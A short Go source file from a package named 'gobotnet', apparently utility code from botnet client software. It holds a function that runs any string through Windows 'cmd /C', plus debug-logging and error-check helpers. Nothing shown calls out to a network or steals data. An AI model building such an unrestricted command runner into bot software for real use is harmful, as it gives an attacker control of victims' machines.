package gobotnet

import (
	"fmt"
	"os/exec"
	"time"
)

var (
	debugMode bool = true
)

func CmdExec(cmd string) ([]byte, error) {
	return exec.Command("cmd", "/C", cmd).Output()
}

func OutMessage(message string) {
	if debugMode && len(message) > 0 {
		currentTime := time.Now().Local()
		fmt.Println("[", currentTime.Format(time.RFC850), "] "+message)
	}
}

func CheckError(err error) bool {
	if err != nil {
		OutMessage(err.Error())
		return true
	}
	return false
}
